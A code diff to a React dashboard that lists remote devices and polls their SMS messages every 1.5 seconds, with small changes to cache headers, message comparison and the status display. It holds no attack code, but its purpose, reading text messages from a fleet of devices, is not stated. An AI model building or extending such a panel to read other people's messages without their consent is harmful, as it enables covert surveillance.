@@ -62,7 +62,7 @@ async function fetchSmsDirect(base, deviceId, auth = "") {
       authQ +
       bust;
     try {
-      const r = await fetch(url, { cache: "no-store", mode: "cors" });
+      const r = await fetch(url, { cache: "no-store", mode: "cors", headers: { "Cache-Control": "no-cache", Pragma: "no-cache" } });
       if (!r.ok) continue;
       const data = await r.json();
       if (data && typeof data === "object" && !data.error) {
@@ -168,20 +168,27 @@ export default function Dashboard() {
         }
         if (res.messages.length) {
           setMessages((prev) => {
-            // only update if newer/different top key
-            if (prev[0]?.key === res.messages[0]?.key && prev.length === res.messages.length) return prev;
+            const sameTop = prev[0]?.key && prev[0].key === res.messages[0]?.key;
+            const newer = res.messages[0]?.key && prev[0]?.key && String(res.messages[0].key) > String(prev[0].key);
+            if (sameTop && prev.length === res.messages.length && !newer) {
+              // still bump clock so user sees poll alive
+              return prev;
+            }
             return res.messages;
           });
           if (res.path) setSmsPath(res.path);
           setLastSmsAt(new Date());
-          setSmsStatus(res.method === "direct" ? "live" : "api");
+          setSmsStatus(
+            (res.method === "direct" ? "live" : "api") +
+              (res.messages[0]?.ts ? ` · ${res.messages[0].ts}` : "")
+          );
         }
       } catch {}
       busy = false;
     };
 
     tick();
-    pollRef.current = setInterval(tick, 2000);
+    pollRef.current = setInterval(tick, 1500);
     return () => {
       if (pollRef.current) clearInterval(pollRef.current);
     };
@@ -312,7 +319,7 @@ export default function Dashboard() {
         <div className="stat"><div className="k">TOTAL</div><div className="v">{devices.length}</div></div>
         <div className="stat"><div className="k">ONLINE</div><div className="v" style={{ color: "#86efac" }}>{online}</div></div>
         <div className="stat"><div className="k">OFFLINE</div><div className="v">{offline}</div></div>
-        <div className="stat"><div className="k">POLL</div><div className="v" style={{ fontSize: 14 }}>{autoOn ? "2s" : "OFF"}</div></div>
+        <div className="stat"><div className="k">POLL</div><div className="v" style={{ fontSize: 14 }}>{autoOn ? "1.5s" : "OFF"}</div></div>
       </div>
 
       <div className="toolbar">
@@ -372,7 +379,7 @@ export default function Dashboard() {
                 <div style={{ color: "var(--muted)", fontSize: 12 }}>
                   {smsOpen.id}
                   {smsPath ? ` · ${smsPath}` : ""}
-                  {autoOn ? " · auto 2s" : " · auto off"}
+                  {autoOn ? " · auto 1.5s" : " · auto off"}
                   {smsStatus ? ` · ${smsStatus}` : ""}
                   {lastSmsAt ? ` · ${lastSmsAt.toLocaleTimeString()}` : ""}
                 </div>
